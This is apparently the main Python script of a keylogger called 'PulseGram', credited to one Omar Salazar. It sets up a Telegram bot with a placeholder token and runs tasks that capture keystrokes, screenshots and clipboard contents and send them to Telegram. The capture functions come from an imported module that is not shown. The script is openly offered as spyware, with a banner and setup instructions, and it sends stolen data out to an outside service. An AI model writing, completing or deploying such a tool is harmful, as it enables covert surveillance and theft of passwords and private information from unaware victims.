import asyncio
import logging
import time
import sys
from telegram import Bot
from helpers import log_error
from keylogger import capture_keystrokes, send_keystrokes_to_telegram, capture_screenshots, log_clipboard

def show_banner():

    banner = r"""
  _____       _           _____                     
 |  __ \     | |         / ____|                    
 | |__) |   _| |___  ___| |  __ _ __ __ _ _ __ ___  
 |  ___/ | | | / __|/ _ \ | |_ | '__/ _` | '_ ` _ \ 
 | |   | |_| | \__ \  __/ |__| | | | (_| | | | | | |
 |_|    \__,_|_|___/\___|\_____|_|  \__,_|_| |_| |_|
                                                                                                        
                 Author: Omar Salazar
                 Version: V.1.0
    """
    print(banner)

def loading_animation(message):

    print(message, end=" ")
    animation = "|/-\\"
    for i in range(20):
        time.sleep(0.2)
        sys.stdout.write("\r" + message + " " + animation[i % len(animation)])
        sys.stdout.flush()
    print() 

async def main():
    logging.basicConfig(filename="errors.log", level=logging.ERROR, format="%(asctime)s - %(message)s")
    
    try:
        show_banner()
        loading_animation("Initializing the Telegram bot")
        bot = Bot(token="773241xxxxxxxx:xxxxxxxx")  # Replace with your bot token.
        loading_animation("Bot initialized. Launching tasks...")
        
        await asyncio.gather(
            capture_keystrokes(bot),
            send_keystrokes_to_telegram(bot),
            capture_screenshots(bot),
            log_clipboard(bot),
        )
        print("Tasks launched successfully.")
    except Exception as e:
        log_error(f"Initialization error: {e}")
        print(f"Error: {e}")

if __name__ == "__main__":
    asyncio.run(main())
